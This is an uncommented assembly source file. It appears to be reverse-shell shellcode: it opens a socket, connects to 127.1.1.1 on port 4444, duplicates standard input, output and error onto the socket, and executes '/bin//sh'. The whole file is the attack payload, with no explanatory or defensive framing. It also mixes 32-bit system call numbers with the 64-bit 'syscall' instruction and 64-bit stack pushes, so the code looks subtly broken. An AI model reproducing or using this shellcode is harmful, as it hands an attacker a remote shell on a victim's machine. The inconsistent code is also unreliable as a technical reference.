.global _start

.text

_start:
    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx
    xor %edx, %edx

    mov $2, %bl
    mov $1, %cl
    mov $6, %dl
    mov $359, %ax
    syscall

    mov %eax, %ebx
    push $0x0101017f
    push $0x5c11
    push $2
    mov %esp, %ecx
    mov $16, %dl
    mov $362, %ax
    syscall

    xor %ecx, %ecx
    mov $3, %cl

dup2:
    xor %eax, %eax
    mov $63, %al
    dec %ecx
    syscall
    inc %ecx
    loop dup2

    xor %eax, %eax
    xor %edx, %edx
    push %rax
    push $0x68732f2f
    push $0x6e69622f
    mov %esp, %ebx
    mov $11, %al
    syscall
